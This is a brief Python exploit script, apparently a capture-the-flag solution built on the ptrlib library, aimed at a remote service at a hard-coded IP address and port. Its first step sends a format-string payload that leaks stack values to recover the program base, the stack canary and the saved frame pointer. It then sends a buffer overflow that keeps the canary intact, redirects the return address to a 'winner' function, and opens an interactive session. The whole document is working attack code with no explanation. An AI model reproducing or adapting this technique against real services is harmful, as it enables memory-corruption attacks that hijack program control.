from ptrlib import *

winner = 0x6080

sock = Socket("54.224.176.60", 1414)

sock.sendlineafter(" :", ".%p" * 50)
r = sock.recvline().split(b".")
proc_base = int(r[13], 16) - 0x6127
logger.info("proc base = " + hex(proc_base))
canary = int(r[30], 16)
logger.info("canary = " + hex(canary))
saved_ebp = int(r[31], 16)
logger.info("saved ebp = " + hex(saved_ebp))

payload = b'A' * 0x40
payload += p32(canary)
payload += p32(saved_ebp)
payload += p32(proc_base + winner)
sock.sendlineafter(" :", payload)

sock.interactive()
